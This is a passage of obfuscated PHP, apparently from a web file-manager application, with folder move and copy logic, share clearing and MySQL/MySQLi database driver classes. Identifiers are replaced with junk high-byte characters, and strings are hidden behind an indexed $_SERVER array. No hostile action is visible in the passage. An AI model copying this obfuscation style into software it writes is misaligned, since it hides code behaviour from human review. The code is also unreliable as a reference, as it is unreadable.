($ãîÒÕçÇ && !$äß’ıà[$Ü¸¢û¶[631]]) { $äß’ıà[$Ü¸¢û¶[631]] = !0; } return $«¾§¡§Ó; } private function _moveForce($êªĞ½­û, $ùï×ë€Ç, $ï«‚ûßı) { $¥ƒ»‡ôò =& $_SERVER[Î‹ÃÂŞ„]; $¬éşøÍÍ = $this->sourceInfo($êªĞ½­û); $ÇÕ‚Òó = $this->sourceInfo($ùï×ë€Ç); $ÅÅì«İ = $¬éşøÍÍ[$¥ƒ»‡ôò[455]] == $¥ƒ»‡ôò[90]; $èÜõ°çÖ = array($¥ƒ»‡ôò[447] => $ÇÕ‚Òó[$¥ƒ»‡ôò[183]], $¥ƒ»‡ôò[623] => $ÇÕ‚Òó[$¥ƒ»‡ôò[556]] . $ÇÕ‚Òó[$¥ƒ»‡ôò[183]] . $¥ƒ»‡ôò[50], $¥ƒ»‡ôò[619] => $ÇÕ‚Òó[$¥ƒ»‡ôò[180]], $¥ƒ»‡ôò[620] => $ÇÕ‚Òó[$¥ƒ»‡ôò[541]], $¥ƒ»‡ôò[622] => USER_ID, $¥ƒ»‡ôò[464] => $ï«‚ûßı); $¡Ş€ÙÂ˜ = $¬éşøÍÍ[$¥ƒ»‡ôò[180]] == SourceModel::TYPE_GROUP && $ÇÕ‚Òó[$¥ƒ»‡ôò[180]] == SourceModel::TYPE_GROUP && $¬éşøÍÍ[$¥ƒ»‡ôò[541]] == $ÇÕ‚Òó[$¥ƒ»‡ôò[541]]; if (!$¡Ş€ÙÂ˜ && $this->moveClearAuth) { Model($¥ƒ»‡ôò[538])->authClear($êªĞ½­û); } $“îªÚ£½ = $¬éşøÍÍ[$¥ƒ»‡ôò[475]] == $¥ƒ»‡ôò[90] && $ÇÕ‚Òó[$¥ƒ»‡ôò[475]] != $¥ƒ»‡ôò[90]; if ($“îªÚ£½) { $èÜõ°çÖ[$¥ƒ»‡ôò[474]] = 0; } if ($ÅÅì«İ) { $ÈøÈèÄ = array($¥ƒ»‡ôò[623] => array($¥ƒ»‡ôò[583], $¬éşøÍÍ[$¥ƒ»‡ôò[556]] . $¬éşøÍÍ[$¥ƒ»‡ôò[183]] . $¥ƒ»‡ôò[584])); $¹©¶ûÜ® = $¬éşøÍÍ[$¥ƒ»‡ôò[556]] . $¬éşøÍÍ[$¥ƒ»‡ôò[183]] . $¥ƒ»‡ôò[50]; $ç¨¹è“› = $ÇÕ‚Òó[$¥ƒ»‡ôò[556]] . $ÇÕ‚Òó[$¥ƒ»‡ôò[183]] . $¥ƒ»‡ôò[50] . $¬éşøÍÍ[$¥ƒ»‡ôò[183]] . $¥ƒ»‡ôò[50]; $ìŒ¹²· = array($¥ƒ»‡ôò[623] => array($¥ƒ»‡ôò[632], "\162\145\x70\154\141\x63\145\50\160\141\162\x65\156\164\x4c\145\x76\x65\154\54\47{$¹©¶ûÜ®}\x27\54\47{$ç¨¹è“›}\x27\x29"), $¥ƒ»‡ôò[619] => $ÇÕ‚Òó[$¥ƒ»‡ôò[180]], $¥ƒ»‡ôò[620] => $ÇÕ‚Òó[$¥ƒ»‡ôò[541]]); if ($“îªÚ£½) { $ìŒ¹²·[$¥ƒ»‡ôò[474]] = 0; } $this->where($ÈøÈèÄ)->data($ìŒ¹²·)->save(); } $this->where(array($¥ƒ»‡ôò[461] => $êªĞ½­û))->data($èÜõ°çÖ)->save(); return $êªĞ½­û; } private function clearShare($ğÊì§ï, $Æ„ä«‰«) { $€¶äåì =& $_SERVER[Î‹ÃÂŞ„]; $Ú‚İœ™¡ = $this->sourceInfo($ğÊì§ï); $­ª•İğ« = $this->sourceInfo($Æ„ä«‰«); if ($Ú‚İœ™¡[$€¶äåì[541]] == $­ª•İğ«[$€¶äåì[541]] && $Ú‚İœ™¡[$€¶äåì[180]] == $€¶äåì[633]) { return; } $çüËµ¤À = array($€¶äåì[556] => array($€¶äåì[583], $Ú‚İœ™¡[$€¶äåì[556]] . $ğÊì§ï . $€¶äåì[584])); $Â®üèÇ§ = $this->field($€¶äåì[461])->where($çüËµ¤À)->getField($€¶äåì[183], !0); if (!$Â®üèÇ§) { return; } $çüËµ¤À = array($€¶äåì[183] => array($€¶äåì[7], $Â®üèÇ§), $€¶äåì[634] => 1); $¢‘ĞçÊî = Model($€¶äåì[635])->field($€¶äåì[636])->where($çüËµ¤À)->select(); if (!$¢‘ĞçÊî) { return; } $¢‘ĞçÊî = array_to_keyvalue($¢‘ĞçÊî, $€¶äåì[12], $€¶äåì[636]); $çüËµ¤À = array($€¶äåì[636] => array($€¶äåì[7], $¢‘ĞçÊî)); Model($€¶äåì[635])->where($çüËµ¤À)->save(array($€¶äåì[634] => 0)); Model($€¶äåì[637])->where($çüËµ¤À)->delete(); } public function copyFolderFromIO($áşê±Ğ¡, $×…‘à¸ò, $‘£Ö†¬, $¾­¤åÇé, $Ûè¤•ÁŒ, $…øƒÊĞê = false) { $…“ÊÃ½ =& $_SERVER[Î‹ÃÂŞ„]; $­ÁñØ†É = array($…“ÊÃ½[601] => array(), $…“ÊÃ½[602] => array(), $…“ÊÃ½[600] => array(), $…“ÊÃ½[638] => array()); $­ËØè‡ = $…øƒÊĞê ? $…øƒÊĞê : $áşê±Ğ¡->pathThis($×…‘à¸ò); $ÙÄßèš¶ = $this->fileNameExist($‘£Ö†¬, $­ËØè‡); $˜…Ó€Š£ = $this->mkdir($‘£Ö†¬, $­ËØè‡, $¾­¤åÇé); if (!$ÙÄßèš¶ || $¾­¤åÇé == REPEAT_RENAME_FOLDER) { $¾­¤åÇé = !1; } if ($ÙÄßèš¶) { $this->_childrenAllMake($ÙÄßèš¶); } Hook::trigger($…“ÊÃ½[639]); $this->_copyChildTo($áşê±Ğ¡, $×…‘à¸ò, $˜…Ó€Š£, $¾­¤åÇé, $­ÁñØ†É, $Ûè¤•ÁŒ); Hook::trigger($…“ÊÃ½[640]); if ($˜…Ó€Š£) { $this->folderSizeResetChildren($˜…Ó€Š£); } $this->_childrenListClear(); Model($…“ÊÃ½[603])->addAll($­ÁñØ†É[$…“ÊÃ½[601]], array(), !0); Model($…“ÊÃ½[604])->eventCopy($˜…Ó€Š£); $this->saveAll($­ÁñØ†É[$…“ÊÃ½[602]]); Model($…“ÊÃ½[514])->linkAdd($­ÁñØ†É[$…“ÊÃ½[600]]); Model($…“ÊÃ½[514])->remove($­ÁñØ†É[$…“ÊÃ½[638]]); $this->folderSizeReset($‘£Ö†¬); $this->updateModifyTime($‘£Ö†¬); return $˜…Ó€Š£; } private function _copyChildTo($ŞĞë¾ùş, $ºÊ°˜ŸÃ, $´‰Îœ†, $®ÇåÅÙÂ, &$ıø—ÀŞÜ, $êÎµœòÃ) { $ÙÌĞÏğø =& $_SERVER[Î‹ÃÂŞ„]; $•–ğåº = $this->sourceInfoCache($´‰Îœ†); $ƒº´Ç¶™ = $ŞĞë¾ùş->listPath($ºÊ°˜ŸÃ); $ƒº´Ç¶™ = $ƒº´Ç¶™ ? $ƒº´Ç¶™ : array($ÙÌĞÏğø[85] => array(), $ÙÌĞÏğø[84] => array()); $Ìğßø = array_merge($ƒº´Ç¶™[$ÙÌĞÏğø[85]], $ƒº´Ç¶™[$ÙÌĞÏğø[84]]); $µãİ‚À« = $this->_addFiles($ŞĞë¾ùş, $ƒº´Ç¶™[$ÙÌĞÏğø[85]], $êÎµœòÃ); $ïãä¸ñÌ = array(); foreach ($Ìğßø as &$¦ûŞÍÊè) { if (isset($µãİ‚À«[$¦ûŞÍÊè[$ÙÌĞÏğø[32]]])) { $¦ûŞÍÊè = $µãİ‚À«[$¦ûŞÍÊè[$ÙÌĞÏğø[32]]]; } $¦ûŞÍÊè[$ÙÌĞÏğø[455]] = $¦ûŞÍÊè[$ÙÌĞÏğø[33]] == $ÙÌĞÏğø[77]; $¦ûŞÍÊè[$ÙÌĞÏğø[456]] = substr(_get($¦ûŞÍÊè, $ÙÌĞÏğø[177], $ÙÌĞÏğø[12]), 0, 10); $¦ûŞÍÊè[$ÙÌĞÏğø[78]] = _get($¦ûŞÍÊè, $ÙÌĞÏğø[78], 0); $¦ûŞÍÊè[$ÙÌĞÏğø[511]] = _get($¦ûŞÍÊè, $ÙÌĞÏğø[511], 0); if (!isset($¦ûŞÍÊè[$ÙÌĞÏğø[641]]) && $¦ûŞÍÊè[$ÙÌĞÏğø[511]]) { $ıø—ÀŞÜ[$ÙÌĞÏğø[638]][] = $¦ûŞÍÊè[$ÙÌĞÏğø[511]]; } if ($®ÇåÅÙÂ) { $¦‡Š…Å = $this->fileNameExistCache($´‰Îœ†, $¦ûŞÍÊè[$ÙÌĞÏğø[32]]); if ($¦‡Š…Å) { if ($¦ûŞÍÊè[$ÙÌĞÏğø[455]] || $®ÇåÅÙÂ == REPEAT_SKIP) { continue; } if ($®ÇåÅÙÂ == REPEAT_REPLACE) { $™Î‚¼¸ = $this->sourceInfoCache($¦‡Š…Å); $óŞÌ£¦° = $this->fileHistory($™Î‚¼¸, $¦ûŞÍÊè[$ÙÌĞÏğø[511]], $¦ûŞÍÊè[$ÙÌĞÏğø[78]]); if ($óŞÌ£¦°) { $ıø—ÀŞÜ[$ÙÌĞÏğø[600]][] = $¦ûŞÍÊè[$ÙÌĞÏğø[511]]; } continue; } else { if ($®ÇåÅÙÂ == REPEAT_RENAME) { $¦ûŞÍÊè[$ÙÌĞÏğø[32]] = $this->fileNameAutoCache($´‰Îœ†, $¦ûŞÍÊè[$ÙÌĞÏğø[32]], $®ÇåÅÙÂ, !1); } } } } if (!$¦ûŞÍÊè[$ÙÌĞÏğø[455]] && $¦ûŞÍÊè[$ÙÌĞÏğø[511]] == 0) { continue; } if (!$¦ûŞÍÊè[$ÙÌĞÏğø[455]] && $¦ûŞÍÊè[$ÙÌĞÏğø[511]]) { $ıø—ÀŞÜ[$ÙÌĞÏğø[600]][] = $¦ûŞÍÊè[$ÙÌĞÏğø[511]]; } $ïãä¸ñÌ[] = $this->_makeItemData($¦ûŞÍÊè, $•–ğåº, $¦ûŞÍÊè[$ÙÌĞÏğø[32]]); } unset($¦ûŞÍÊè); if (!empty($ïãä¸ñÌ)) { $this->addAll($ïãä¸ñÌ); $this->_childrenListSelect($´‰Îœ†); } $¦³Øè¥ = $this->_childrenList($´‰Îœ†); $¦³Øè¥ = array_to_keyvalue($¦³Øè¥, $ÙÌĞÏğø[32]); foreach ($Ìğßø as $¦ûŞÍÊè) { $™Î‚¼¸ = $¦³Øè¥[$¦ûŞÍÊè[$ÙÌĞÏğø[32]]]; $µ×¯Ä™ = $™Î‚¼¸[$ÙÌĞÏğø[183]]; $this->_copyApplyMeta($™Î‚¼¸, $ıø—ÀŞÜ); if ($¦ûŞÍÊè[$ÙÌĞÏğø[33]] == $ÙÌĞÏğø[77]) { $¦ûŞÍÊè[$ÙÌĞÏğø[86]] = $ŞĞë¾ùş->getPathInner($¦ûŞÍÊè[$ÙÌĞÏğø[86]]); $this->_copyChildTo($ŞĞë¾ùş, $¦ûŞÍÊè[$ÙÌĞÏğø[86]], $µ×¯Ä™, $®ÇåÅÙÂ, $ıø—ÀŞÜ, $êÎµœòÃ); } } } private function _addFiles($ç ­â, $Áì¬ïÖ, $¬¥ƒû„) { $ÜÍ–ìƒ£ =& $_SERVER[Î‹ÃÂŞ„]; if (!$Áì¬ïÖ || count($Áì¬ïÖ) == 0) { return array(); } $Ï•ĞóˆÏ = array(); foreach ($Áì¬ïÖ as &$óè‚Òİ–) { Hook::trigger($ÜÍ–ìƒ£[642], $óè‚Òİ–); $óè‚Òİ–[$ÜÍ–ìƒ£[86]] = $ç ­â->getPathInner($óè‚Òİ–[$ÜÍ–ìƒ£[86]]); $à ±ÚÀÔ = $ç ­â->hashSimple($óè‚Òİ–[$ÜÍ–ìƒ£[86]]); $õã÷â›â = $ç ­â->hashMd5($óè‚Òİ–[$ÜÍ–ìƒ£[86]]); if (strlen($õã÷â›â) > 10 && !isset($Ï•ĞóˆÏ[$õã÷â›â])) { $Ï•ĞóˆÏ[$õã÷â›â] = array(); } $óè‚Òİ–[$ÜÍ–ìƒ£[643]] = $à ±ÚÀÔ; $óè‚Òİ–[$ÜÍ–ìƒ£[517]] = $õã÷â›â; $Ï•ĞóˆÏ[$õã÷â›â][] =& $óè‚Òİ–; if (count($Ï•ĞóˆÏ[$õã÷â›â]) > 1) { $óè‚Òİ–[$ÜÍ–ìƒ£[641]] = !0; } Hook::trigger($ÜÍ–ìƒ£[644], $óè‚Òİ–); } unset($óè‚Òİ–); $•ü¾å—Ü = array($ÜÍ–ìƒ£[517] => array($ÜÍ–ìƒ£[7], array_keys($Ï•ĞóˆÏ))); $®÷¼‘ßø = Model($ÜÍ–ìƒ£[645]); $÷¿æ—ÍØ = $®÷¼‘ßø->where($•ü¾å—Ü)->select(); $÷¿æ—ÍØ = $÷¿æ—ÍØ ? $÷¿æ—ÍØ : array(); foreach ($÷¿æ—ÍØ as $¢Êõ©Ë) { if (!isset($Ï•ĞóˆÏ[$¢Êõ©Ë[$ÜÍ–ìƒ£[517]]])) { continue; } $Úî‡õğ¨ = $Ï•ĞóˆÏ[$¢Êõ©Ë[$ÜÍ–ìƒ£[517]]]; foreach ($Úî‡õğ¨ as &$óè‚Òİ–) { $óè‚Òİ–[$ÜÍ–ìƒ£[511]] = $¢Êõ©Ë[$ÜÍ–ìƒ£[511]]; $óè‚Òİ–[$ÜÍ–ìƒ£[641]] = !0; } unset($óè‚Òİ–); } $ëİæ©Š‚ = array(); foreach ($Áì¬ïÖ as $‰Õİ¹úî) { Hook::trigger($ÜÍ–ìƒ£[646], $‰Õİ¹úî); if (isset($‰Õİ¹úî[$ÜÍ–ìƒ£[641]]) && $‰Õİ¹úî[$ÜÍ–ìƒ£[641]]) { Hook::trigger($ÜÍ–ìƒ£[647], $‰Õİ¹úî); continue; } $úİ‹à†Ğ = $ç ­â->getPathInner($‰Õİ¹úî[$ÜÍ–ìƒ£[86]]); $ôŠ­£âŞ = $®÷¼‘ßø->addFileMake($úİ‹à†Ğ, $‰Õİ¹úî[$ÜÍ–ìƒ£[78]], $‰Õİ¹úî[$ÜÍ–ìƒ£[643]], $‰Õİ¹úî[$ÜÍ–ìƒ£[517]], $‰Õİ¹úî[$ÜÍ–ìƒ£[32]], $¬¥ƒû„); Hook::trigger($ÜÍ–ìƒ£[647], $‰Õİ¹úî); if (!is_array($ôŠ­£âŞ)) { continue; } $ëİæ©Š‚[] = $ôŠ­£âŞ; } $®÷¼‘ßø->addAll($ëİæ©Š‚); $•ü¾å—Ü = array($ÜÍ–ìƒ£[517] => array($ÜÍ–ìƒ£[7], array_keys($Ï•ĞóˆÏ))); $÷¿æ—ÍØ = $®÷¼‘ßø->where($•ü¾å—Ü)->select(); $÷¿æ—ÍØ = $÷¿æ—ÍØ ? $÷¿æ—ÍØ : array(); foreach ($÷¿æ—ÍØ as $¢Êõ©Ë) { if (!isset($Ï•ĞóˆÏ[$¢Êõ©Ë[$ÜÍ–ìƒ£[517]]])) { continue; } $„×¸‰î =& $Ï•ĞóˆÏ[$¢Êõ©Ë[$ÜÍ–ìƒ£[517]]]; foreach ($„×¸‰î as &$óè‚Òİ–) { $óè‚Òİ–[$ÜÍ–ìƒ£[511]] = $¢Êõ©Ë[$ÜÍ–ìƒ£[511]]; } unset($óè‚Òİ–); } $ÌÂá•³ = array(); foreach ($Áì¬ïÖ as $ê¸—€¥…) { $ÌÂá•³[$ê¸—€¥…[$ÜÍ–ìƒ£[32]]] = $ê¸—€¥…; } return $ÌÂá•³; } } goto c³‹“³ªÖ­; d†±¥à×¢“: define($_SERVER[Î‹ÃÂŞ„][287], 1); define($_SERVER[Î‹ÃÂŞ„][288], 0); define($_SERVER[Î‹ÃÂŞ„][289], 2); goto F¯ÙÂà¸œ; cóªîÇ·Å: class DbMysql extends Db { public function __construct($±Ñ–‰±® = '') { $–ŸÒÇ‡ =& $_SERVER[Î‹ÃÂŞ„]; if (!extension_loaded($–ŸÒÇ‡[851])) { think_exception(think_lang($–ŸÒÇ‡[14]) . $–ŸÒÇ‡[939]); } if (!empty($±Ñ–‰±®)) { $this->config = $±Ñ–‰±®; if (empty($this->config[$–ŸÒÇ‡[17]])) { $this->config[$–ŸÒÇ‡[17]] = $–ŸÒÇ‡[12]; } } } public function connect($ºÑ‹†ø¸ = '', $–Æº¦ÈÊ = 0, $˜²¸Á = false) { $ŞŞí½¼¾ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->linkID[$–Æº¦ÈÊ])) { if (empty($ºÑ‹†ø¸)) { $ºÑ‹†ø¸ = $this->config; } $öÀ–˜ôú = $ºÑ‹†ø¸[$ŞŞí½¼¾[940]] . ($ºÑ‹†ø¸[$ŞŞí½¼¾[941]] ? "\72{$ºÑ‹†ø¸[$ŞŞí½¼¾[941]]}" : $ŞŞí½¼¾[12]); $«©´Ç³µ = !empty($ºÑ‹†ø¸[$ŞŞí½¼¾[17]][$ŞŞí½¼¾[18]]) ? $ºÑ‹†ø¸[$ŞŞí½¼¾[17]][$ŞŞí½¼¾[18]] : $this->pconnect; if ($«©´Ç³µ) { $this->linkID[$–Æº¦ÈÊ] = mysql_pconnect($öÀ–˜ôú, $ºÑ‹†ø¸[$ŞŞí½¼¾[942]], $ºÑ‹†ø¸[$ŞŞí½¼¾[943]], 131072); } else { $this->linkID[$–Æº¦ÈÊ] = mysql_connect($öÀ–˜ôú, $ºÑ‹†ø¸[$ŞŞí½¼¾[942]], $ºÑ‹†ø¸[$ŞŞí½¼¾[943]], !0, 131072); } if (!$this->linkID[$–Æº¦ÈÊ] || !empty($ºÑ‹†ø¸[$ŞŞí½¼¾[21]]) && !mysql_select_db($ºÑ‹†ø¸[$ŞŞí½¼¾[21]], $this->linkID[$–Æº¦ÈÊ])) { think_exception(mysql_error()); } $üıÈâ™¯ = mysql_get_server_info($this->linkID[$–Æº¦ÈÊ]); mysql_query($ŞŞí½¼¾[944] . think_config($ŞŞí½¼¾[945]) . $ŞŞí½¼¾[58], $this->linkID[$–Æº¦ÈÊ]); if ($üıÈâ™¯ > $ŞŞí½¼¾[946]) { mysql_query($ŞŞí½¼¾[947], $this->linkID[$–Æº¦ÈÊ]); } $this->connected = !0; if (1 != think_config($ŞŞí½¼¾[22])) { unset($this->config); } } return $this->linkID[$–Æº¦ÈÊ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¤ôÛ¿ƒ¡) { $ˆ«ã§ç× =& $_SERVER[Î‹ÃÂŞ„]; if (0 === stripos($¤ôÛ¿ƒ¡, $ˆ«ã§ç×[310])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¤ôÛ¿ƒ¡; if ($this->queryID) { $this->free(); } think_action_status($ˆ«ã§ç×[23], 1); think_status($ˆ«ã§ç×[24]); $this->queryID = mysql_query($¤ôÛ¿ƒ¡, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Âƒí«Ïœ) { $´ ÌÈ„Ï =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Âƒí«Ïœ; if ($this->queryID) { $this->free(); } think_action_status($´ ÌÈ„Ï[25], 1); think_status($´ ÌÈ„Ï[24]); $°ú®É‚ = mysql_query($Âƒí«Ïœ, $this->_linkID); $this->debug(); if (!1 === $°ú®É‚) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Î‹ÃÂŞ„][948], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âôˆÏòË = mysql_query($_SERVER[Î‹ÃÂŞ„][949], $this->_linkID); $this->transTimes = 0; if (!$âôˆÏòË) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Î„÷°áÀ = mysql_query($_SERVER[Î‹ÃÂŞ„][950], $this->_linkID); $this->transTimes = 0; if (!$Î„÷°áÀ) { $this->error(); return !1; } } return !0; } private function getAll() { $€„¿—Ëµ = array(); if ($this->numRows > 0) { while ($’¥×€µ¸ = mysql_fetch_assoc($this->queryID)) { $€„¿—Ëµ[] = $’¥×€µ¸; } mysql_data_seek($this->queryID, 0); } return $€„¿—Ëµ; } public function getFields($Òéô·æà) { $üÃ¸äŞú =& $_SERVER[Î‹ÃÂŞ„]; $ØøŠ¥˜Ø = $this->query($üÃ¸äŞú[951] . $this->parseKey($Òéô·æà)); $ŸÃ¨²Ê• = array(); if ($ØøŠ¥˜Ø) { foreach ($ØøŠ¥˜Ø as $¯Ÿğ§Ü => $è¼î­„ø) { $ŸÃ¨²Ê•[$è¼î­„ø[$üÃ¸äŞú[31]]] = array($üÃ¸äŞú[32] => $è¼î­„ø[$üÃ¸äŞú[31]], $üÃ¸äŞú[33] => $è¼î­„ø[$üÃ¸äŞú[34]], $üÃ¸äŞú[35] => (bool) (strtoupper($è¼î­„ø[$üÃ¸äŞú[36]]) === $üÃ¸äŞú[952]), $üÃ¸äŞú[37] => $è¼î­„ø[$üÃ¸äŞú[38]], $üÃ¸äŞú[39] => strtolower($è¼î­„ø[$üÃ¸äŞú[40]]) == $üÃ¸äŞú[41], $üÃ¸äŞú[42] => strtolower($è¼î­„ø[$üÃ¸äŞú[43]]) == $üÃ¸äŞú[44]); } } return $ŸÃ¨²Ê•; } public function getTables($¸İ‘±’ = '') { $ˆ•¶Ê‡ù =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($¸İ‘±’)) { $‰‚•×ûÇ = $ˆ•¶Ê‡ù[953] . $¸İ‘±’ . $ˆ•¶Ê‡ù[954]; } else { $‰‚•×ûÇ = $ˆ•¶Ê‡ù[955]; } $Ã³Â‡ Ğ = $this->query($‰‚•×ûÇ); $²ñø¬Äš = array(); foreach ($Ã³Â‡ Ğ as $ÛÛéÄë» => $ôÈêäŸİ) { $²ñø¬Äš[$ÛÛéÄë»] = current($ôÈêäŸİ); } return $²ñø¬Äš; } public function replace($®‚¢¡ğ™, $ªöĞÃ®è = array()) { $Ğ§‡èˆğ =& $_SERVER[Î‹ÃÂŞ„]; foreach ($®‚¢¡ğ™ as $†ç£º¬ª => $ã²Ú¼¶ï) { $íÛ´ŞùË = $this->parseValue($ã²Ú¼¶ï); if (is_scalar($íÛ´ŞùË)) { $¾¼ã¢úö[] = $íÛ´ŞùË; $áş–§ı½[] = $this->parseKey($†ç£º¬ª); } } $ùÇ©ôĞ’ = $Ğ§‡èˆğ[956] . $this->parseTable($ªöĞÃ®è[$Ğ§‡èˆğ[325]]) . $Ğ§‡èˆğ[957] . implode($Ğ§‡èˆğ[50], $áş–§ı½) . $Ğ§‡èˆğ[958] . implode($Ğ§‡èˆğ[50], $¾¼ã¢úö) . $Ğ§‡èˆğ[959]; return $this->execute($ùÇ©ôĞ’); } public function insertAll($Ã¾÷ÏÄÍ, $©Ãíûü· = array(), $”ñé¦ï´ = false) { $ğÒ­œè =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($Ã¾÷ÏÄÍ[0])) { return !1; } $ñ½‰…ûì = array_keys($Ã¾÷ÏÄÍ[0]); $œêáŸÙ = array(); foreach ($Ã¾÷ÏÄÍ as $Ë×Î§) { $˜ñ˜Öš£ = array(); foreach ($Ë×Î§ as $ş·İßè => $é™¯ËÕ¦) { $é™¯ËÕ¦ = $this->parseValue($é™¯ËÕ¦); if (is_scalar($é™¯ËÕ¦)) { $˜ñ˜Öš£[] = $é™¯ËÕ¦; } } $œêáŸÙ[] = $ğÒ­œè[306] . implode($ğÒ­œè[50], $˜ñ˜Öš£) . $ğÒ­œè[959]; } array_walk($ñ½‰…ûì, array($this, $ğÒ­œè[960])); $ó”ú›„à = ($”ñé¦ï´ ? $ğÒ­œè[961] : $ğÒ­œè[962]) . $ğÒ­œè[963] . $this->parseTable($©Ãíûü·[$ğÒ­œè[325]]) . $ğÒ­œè[957] . implode($ğÒ­œè[50], $ñ½‰…ûì) . $ğÒ­œè[964] . implode($ğÒ­œè[50], $œêáŸÙ); return $this->execute($ó”ú›„à); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¯í«‹Öí =& $_SERVER[Î‹ÃÂŞ„]; $this->error = mysql_errno() . $¯í«‹Öí[4] . mysql_error($this->_linkID); if ($¯í«‹Öí[12] != $this->queryStr) { $this->error .= LNG($¯í«‹Öí[48]) . $this->queryStr; } think_trace($this->error, $¯í«‹Öí[12], $¯í«‹Öí[49]); return $this->error; } public function escapeString($Œ“Úê¾›) { if ($this->_linkID) { return mysql_real_escape_string($Œ“Úê¾›, $this->_linkID); } else { return mysql_escape_string($Œ“Úê¾›); } } public function parseKey(&$¼°Ù£Æª, $­­¶é†£ = true) { $Ÿ­Û½ë =& $_SERVER[Î‹ÃÂŞ„]; if ($­­¶é†£) { $¼°Ù£Æª = $this->parseKeyCheck($¼°Ù£Æª); } if ($¼°Ù£Æª != $Ÿ­Û½ë[205] && !preg_match($Ÿ­Û½ë[965], $¼°Ù£Æª)) { $¼°Ù£Æª = $Ÿ­Û½ë[431] . trim($¼°Ù£Æª, $Ÿ­Û½ë[431]) . $Ÿ­Û½ë[431]; } return $¼°Ù£Æª; } } class DbMysqli extends Db { public function __construct($üÍãÄÑİ = '') { $øüæÆá =& $_SERVER[Î‹ÃÂŞ„]; if (!extension_loaded($øüæÆá[966])) { think_exception(think_lang($øüæÆá[14]) . $øüæÆá[967]); } if (!empty($üÍãÄÑİ)) { $this->config = $üÍãÄÑİ; if (empty($this->config[$øüæÆá[17]])) { $this->config[$øüæÆá[17]] = $øüæÆá[12]; } } } public function connect($Ø³¢‰¢… = '', $ºô”¿Ñ¬ = 0) { $±…ÛçË¢ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->linkID[$ºô”¿Ñ¬])) { if (empty($Ø³¢‰¢…)) { $Ø³¢‰¢… = $this->config; } $this->linkID[$ºô”¿Ñ¬] = new mysqli($Ø³¢‰¢…[$±…ÛçË¢[940]], $Ø³¢‰¢…[$±…ÛçË¢[942]], $Ø³¢‰¢…[$±…ÛçË¢[943]], $Ø³¢‰¢…[$±…ÛçË¢[21]], $Ø³¢‰¢…[$±…ÛçË¢[941]] ? intval($Ø³¢‰¢…[$±…ÛçË¢[941]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ªğˆí¼„ = $this->linkID[$ºô”¿Ñ¬]->server_version; $this->linkID[$ºô”¿Ñ¬]->query($±…ÛçË¢[944] . think_config($±…ÛçË¢[945]) . $±…ÛçË¢[58]); if ($ªğˆí¼„ > $±…ÛçË¢[946]) { $this->linkID[$ºô”¿Ñ¬]->query($±…ÛçË¢[947]); } $this->connected = !0; if (1 != think_config($±…ÛçË¢[22])) { unset($this->config); } } return $this->linkID[$ºô”¿Ñ¬]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ß„ÆŞïÎ) { $ŠÎØ„®Ä =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ß„ÆŞïÎ; if ($this->queryID) { $this->free(); } think_action_status($ŠÎØ„®Ä[23], 1); think_status($ŠÎØ„®Ä[24]); $this->queryID = $this->_linkID->query($ß„ÆŞïÎ); if ($this->_linkID->more_results()) { while (($¤é€ºî = $this->_linkID->next_result()) != NULL) { $¤é€ºî->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Àæ «Ÿ) { $ƒ‡çÈş =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Àæ «Ÿ; if ($this->queryID) { $this->free(); } think_action_status($ƒ‡çÈş[25], 1); think_status($ƒ‡çÈş[24]); $×…³ß¿ = $this->_linkID->query($Àæ «Ÿ); $this->debug(); if (!1 === $×…³ß¿) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯—Şô€¥ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¯—Şô€¥) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„ÜÃïæ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$„ÜÃïæ) { $this->error(); return !1; } } return !0; } private function getAll() { $ü†—³­ = array(); if ($this->numRows > 0) { for ($ã™ú†Â = 0; $ã™ú†Â < $this->numRows; $ã™ú†Â++) { $ü†—³­[$ã™ú†Â] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ü†—³­; } public function getFields($ÄÒ¬Ûƒ„) { $˜ò±ıİí =& $_SERVER[Î‹ÃÂŞ„]; $±š‚êæ« = $this->query($˜ò±ıİí[951] . $this->parseKey($ÄÒ¬Ûƒ„)); $Şòéª™¢ = array(); if ($±š‚êæ«) { foreach ($±š‚êæ« as $Ìæ—ª¦ => $”äÑ–«³) { $Şòéª™¢[$”äÑ–«³[$˜ò±ıİí[31]]] = array($˜ò±ıİí[32] => $”äÑ–«³[$˜ò±ıİí[31]], $˜ò±ıİí[33] => $”äÑ–«³[$˜ò±ıİí[34]], $˜ò±ıİí[35] => (bool) ($”äÑ–«³[$˜ò±ıİí[36]] === 